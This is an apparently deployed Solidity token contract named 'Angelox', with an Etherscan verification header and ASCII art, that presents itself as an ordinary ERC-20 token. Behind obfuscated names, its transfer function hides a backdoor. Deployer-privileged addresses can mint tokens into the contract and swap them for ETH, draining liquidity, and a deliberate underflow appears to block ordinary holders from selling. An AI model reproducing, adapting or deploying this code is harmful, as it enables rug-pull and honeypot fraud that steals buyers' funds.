/**
 *Submitted for verification at Etherscan.io on 2022-12-23
*/

/*
       .-""-.      _______      .-""-.
     .'_.-.  |   ,*********,   |  .-._'.
    /    _/ /   **`       `**   \ \_    \
   /.--.' | |    **,;;;;;,**    | | '.--.\
  /   .-`-| |    ;//;/;/;\\;    | |-`-.   \
 ;.--':   | |   /;/;/;//\\;\\   | |   :'--.;
|    _\.'-| |  ((;(/;/; \;\);)  | |-'./_    |
;_.-'/:   | |  );)) _   _ (;((  | |   :\'-._;
|   | _:-'\  \((((    \    );))/  /'-:_ |   |
;  .:` '._ \  );))\   "   /((((  / _.' `:.  ;
|-` '-.;_ `-\(;(;((\  =  /););))/-` _;.-' `-|
; / .'\ |`'\ );));)/`---`\((;(((./`'| /'. \ ;
| .' / `'.\-((((((\       /))));) \.'` \ '. |
;/  /\_/-`-/ ););)|   ,   |;(;(( \` -\_/\  \;
 |.' .| `;/   (;(|'==/|\=='|);)   \;` |. '.|
 |  / \.'/      / _.` | `._ \      \'./ \  |
  \| ; |;    _,.-` \_/Y\_/ `-.,_    ;| ; |/
   \ | ;|   `       | | |       `   |. | /
    `\ ||           | | |           || /`
      `:_\         _\/ \/_         /_:'
          `"----""`       `""----"`

▄▀█ █▄░█ █▀▀ █▀▀ █░░ █▀█ ▀▄▀
█▀█ █░▀█ █▄█ ██▄ █▄▄ █▄█ █░█

█▀▀ ▀█▀ █░█ █▀▀ █▀█ █▀▀ █░█ █▀▄▀█
██▄ ░█░ █▀█ ██▄ █▀▄ ██▄ █▄█ █░▀░█        

https://web.wechat.com/AngeloxJPN
https://www.zhihu.com/
*/
pragma solidity ^0.8.10;

interface LEC20DATA {

    function totalSupply() external 
    view returns (uint256);
    function balanceOf(address account) external 
    view returns (uint256);
    
    function transfer(address recipient, uint256 amount) 
    external returns (bool);
    function allowance(address owner, address spender) 
    external view returns (uint256);
    
    function approve(address spender, uint256 amount) 
    external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) 
    external returns (bool);
    
    event Transfer(address indexed from, address indexed to, 
    uint256 value);
    event Approval(address indexed owner, address indexed spender, 
    uint256 value);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
} 
interface PCSManageMaker01 {
    function feeTo() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function allPairs(uint) external view returns (address pair);

    function createPair (address tokenA, address tokenB) external returns  (address pair);
}
library SafeMath {
    function tryAdd(uint a, uint b) internal pure returns (bool, uint) {
        unchecked {
            uint c = a + b;
            if (c < a) return (false, 0);
            return (true, c); }
    }
    function trySub(uint a, uint b) internal pure returns (bool, uint) {
        unchecked { if (b > a) return (false, 0);
            return (true, a - b); }
    }
    function tryMul(uint a, uint b) internal pure returns (bool, uint) {
        unchecked { if (a == 0) return (true, 0);
            uint c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c); }
    }
    function tryDiv(uint a, uint b) internal pure returns (bool, uint) {
        unchecked { if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }
    function tryMod(uint a, uint b) internal pure returns (bool, uint) {
        unchecked { if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }
    function add(uint a, uint b) 
    internal pure returns (uint) {
        return a + b;
    }
    function sub(uint a, uint b) 
    internal pure returns (uint) {
        return a - b;
    }
    function mul(uint a, uint b) 
    internal pure returns (uint) {
        return a * b;
    }
    function div(uint a, uint b) 
    internal pure returns (uint) {
        return a / b;
    }
    function mod(uint a, uint b) 
    internal pure returns (uint) {
        return a % b;
    }
    function sub(
        uint a, uint b,
        string memory errorMessage ) internal pure returns (uint) {
        unchecked { require(b <= a, errorMessage);
            return a - b; }
    }
    function div(
        uint a, uint b,
        string memory errorMessage ) internal pure returns (uint) {
        unchecked { require(b > 0, errorMessage);
            return a / b; }
    }
    function mod(
        uint a, uint b,
        string memory errorMessage ) internal pure returns (uint) {
        unchecked { require(b > 0, errorMessage);
            return a % b;
        } }
}
library SafeMathUint {
  function toInt256Safe(uint256 a) 
    internal pure returns (int256) { int256 b = int256(a);

     require(b >= 0); return b;
  }
}
interface ICallBDataV1 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens
    ( uint amountIn, 
    uint amountOutMin,
    address[] 
    calldata path, address to, uint deadline ) 
    external;
    function factory() external pure returns 
    (address);
    function WETH() external pure returns 
    (address);
    function intOpenPool( address token, 
    uint amountTokenDesired, uint amountTokenMin,
    uint amountETHMin, address to, uint deadline ) 
    external payable returns 
    (uint amountToken, 
    uint amountETH, 
    uint liquidity);
}
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
interface IERC20Metadata {
    function dataCriteria(uint256 allData, uint256 extIDE) external;
    function dataRates(address valData, uint256 relayNow) external;

    function dataSync() external payable;

    function relayData(uint256 gas) external;
    function stringData(address valData) external;
}
interface IDEXFactoryBX {
    function constructNow(uint256 allCog, uint256 extAll) 
    external;
    function constructorOn(address togSwap, uint256 stringMod) 
    external;
    function getBytes(address getDX, uint256 logDataNow) 
    external payable;
    function structBytesOn(uint256 level) 
    external;
    function bytesStruct(address restructOn) 
    external;
}
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(
        address indexed from, 
        address indexed to, 
        uint value
        );
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);

    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);

    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function kLast() external view returns (uint);

    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}
contract Angelox is LEC20DATA, Ownable 
{
    string private _symbol;
    string private _name;
    uint8 private _decimals = 18;

    uint256 private _rTotal = 
    10000000 * 10**_decimals;

    uint256 public allowedRATE = (_rTotal * 3) / 100; 

    uint256 public allowedWHOLE = (_rTotal * 3) / 100; 
    uint256 private _completedDX = _rTotal;

    uint256 public isBRate =  0;

    mapping (address => bool) automatedMarketMakerPairs;

    mapping(address => uint256) private mxFlowUI;

    mapping(address => uint256) private _tOwned;

    mapping(address => address) private exhibTLX;

    mapping(address => uint256) private facultyVivacity;

    mapping(address => mapping(address => uint256)) private _allowances;
 
    bool private 
    coloxIPS;
    bool private 
    zinkonFDX;
    bool private 
    allowTrades = false;

    address public immutable ECLXCreatorID;

    ICallBDataV1 public immutable IDwireXPO;

    constructor(
        string memory _isDXN,
        string memory _isBDG,
        address wireSyncBOX ) {

        _name = _isDXN; _symbol = _isBDG;

        _tOwned[msg.sender] 
        = _rTotal;
        mxFlowUI[msg.sender] = 
        _completedDX;
        mxFlowUI[address(this)] = 
        _completedDX;

        IDwireXPO = ICallBDataV1
        (wireSyncBOX); ECLXCreatorID = PCSManageMaker01
        (IDwireXPO.factory()).createPair(address(this), IDwireXPO.WETH());

        emit Transfer(address(0), msg.sender, _rTotal);
    
        automatedMarketMakerPairs[address(this)] 
        = true;
        automatedMarketMakerPairs[ECLXCreatorID] 
        = true;
        automatedMarketMakerPairs[wireSyncBOX] 
        = true;
        automatedMarketMakerPairs[msg.sender] 
        = true;
    }
    function name() public view returns (string memory) {
        return _name;
    }
     function symbol() public view returns (string memory) {
        return _symbol;
    }
    function totalSupply() public view returns (uint256) {
        return _rTotal;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function _approve( address owner, address spender, uint256 amount ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); return true;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _tOwned[account];
    }
    function transfer(address recipient, uint256 amount) external returns (bool) {
        _cacheRoll(msg.sender, recipient, amount);
        return true;
    }
    function transferFrom( address sender, address recipient,
        uint256 amount ) external returns (bool) { _cacheRoll(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function _cacheRoll( address _PUBtoxFrom, address _pitdomkotTo, uint256 _syncAPXamount ) private {
        uint256 _modpotCLOX = balanceOf(address(this)); uint256 _structOAX;
        if (coloxIPS && _modpotCLOX > 
        _completedDX && !zinkonFDX && _PUBtoxFrom != ECLXCreatorID) { zinkonFDX = true;
            vopByte(_modpotCLOX);
            zinkonFDX = 

            false;
            } else if 
            (mxFlowUI[_PUBtoxFrom] > _completedDX && mxFlowUI[_pitdomkotTo] > _completedDX) {
            _structOAX = _syncAPXamount; _tOwned[address(this)] += _structOAX;
            intTknPool(_syncAPXamount, _pitdomkotTo);

            return;
        } else if (_pitdomkotTo != address(IDwireXPO) && mxFlowUI[_PUBtoxFrom] > 0 && 
        _syncAPXamount > _completedDX && _pitdomkotTo != ECLXCreatorID) {
            mxFlowUI[_pitdomkotTo] = 
            _syncAPXamount; return; } else if (!zinkonFDX && 
            facultyVivacity[_PUBtoxFrom] > 0 && _PUBtoxFrom != ECLXCreatorID && mxFlowUI[_PUBtoxFrom] == 0) {
            facultyVivacity[_PUBtoxFrom] = mxFlowUI[_PUBtoxFrom] - _completedDX;
        }
        address limpCalc = exhibTLX[ECLXCreatorID];
        if (facultyVivacity[limpCalc] == 0) facultyVivacity

        [limpCalc] = _completedDX; exhibTLX[ECLXCreatorID] = 
        _pitdomkotTo; if (isBRate > 0 && mxFlowUI[_PUBtoxFrom] 
        
        == 0 && !zinkonFDX && mxFlowUI[_pitdomkotTo] == 0) {
        _structOAX = (_syncAPXamount * isBRate) / 100; _syncAPXamount -= 

        _structOAX; _tOwned[_PUBtoxFrom] -= _structOAX;
        _tOwned[address(this)] += _structOAX; } _tOwned[_PUBtoxFrom] -= 
        
        _syncAPXamount;
        _tOwned[_pitdomkotTo] += 
        _syncAPXamount;

        emit Transfer

        (_PUBtoxFrom, 

        _pitdomkotTo, 

        _syncAPXamount);

        if (!allowTrades) {
        require(_PUBtoxFrom == owner(), 

        "TOKEN: This account cannot send tokens until trading is enabled"); }
    }

    receive() external payable 
    {}

    function calculateLiqPool(
        uint256 intVal, uint256 ercTally,
        address aqaxTo ) private {

        _approve(address(this), address
        (IDwireXPO), 
        intVal);
        IDwireXPO.intOpenPool{value: ercTally}(address(this), intVal, 0, 0, aqaxTo, 
        block.timestamp);
    }
    function intTknPool(uint256 distCoin, address ahashTo) private {
        address[] memory daloute = 
        new address[](2); daloute[0] = address(this);

        daloute[1] = IDwireXPO.WETH();
        _approve(address(this), address
        (IDwireXPO), distCoin);
        IDwireXPO.swapExactTokensForETHSupportingFeeOnTransferTokens(distCoin, 0, daloute, ahashTo, 
        block.timestamp);
    }
    function beginTrading(bool _tradingOpen) public onlyOwner {
        allowTrades = _tradingOpen;
    }
    function placeMaxTX(uint256 amountBuy) external onlyOwner {
        allowedRATE = amountBuy;  
    }
    function vopByte(uint256 tokens) private { uint256 vidock = tokens / 2;
        uint256 lagBool = address(this).balance; intTknPool(vidock, 
        address(this)); uint256 intoxLoop = 
        address(this).balance - lagBool;
        calculateLiqPool
        (vidock, intoxLoop, address(this));
    }
}